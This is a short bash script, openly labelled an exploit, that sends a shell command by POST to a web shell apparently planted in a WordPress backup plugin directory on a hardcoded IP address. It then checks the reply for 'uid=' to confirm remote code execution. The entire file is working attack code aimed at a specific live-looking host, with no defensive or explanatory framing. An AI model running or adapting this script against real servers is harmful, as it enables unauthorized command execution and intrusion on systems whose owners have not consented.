#!/bin/bash

TARGET="http://3.145.63.77/wp-content/plugins/backup-backup/shell.php"
COMMAND="id"

echo "🌐 Target: $TARGET"
echo "🧨 Sending command: $COMMAND"

response=$(curl -s -X POST "$TARGET" -d "cmd=$COMMAND")

if echo "$response" | grep -q "uid="; then
  echo "✅ Exploit worked! Response:"
  echo "$response"
else
  echo "❌ Exploit failed or plugin not vulnerable"
  echo "Response:"
  echo "$response"
fi
